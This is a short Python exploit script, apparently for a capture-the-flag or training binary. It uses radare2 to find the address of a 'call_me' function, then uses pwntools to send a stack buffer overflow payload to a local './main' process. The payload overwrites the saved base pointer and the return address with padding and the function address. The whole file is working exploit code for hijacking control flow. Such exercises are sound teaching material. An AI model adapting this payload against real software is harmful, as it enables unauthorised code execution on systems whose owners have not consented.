import r2pipe
import json
from pwn import *

CALL_ME = 0x00400577

APP = "./main"

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis
symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['type'] == 'FUNC' and i['name'] == 'call_me':
        CALL_ME = i['vaddr']
        print("call_me find on {}".format(hex(CALL_ME)))
        break

s = process(APP)

# Uncomment for debugging
#s = process("./main")
#gdb.attach(s, 'b*0x080484af')

payload = 'A'*128
payload += 'BBBBBBBB' # RBP
payload += p64(CALL_ME)
payload += p64(0x41) # RET

payload += '\n'
s.send(payload)
print(s.recv())
s.close()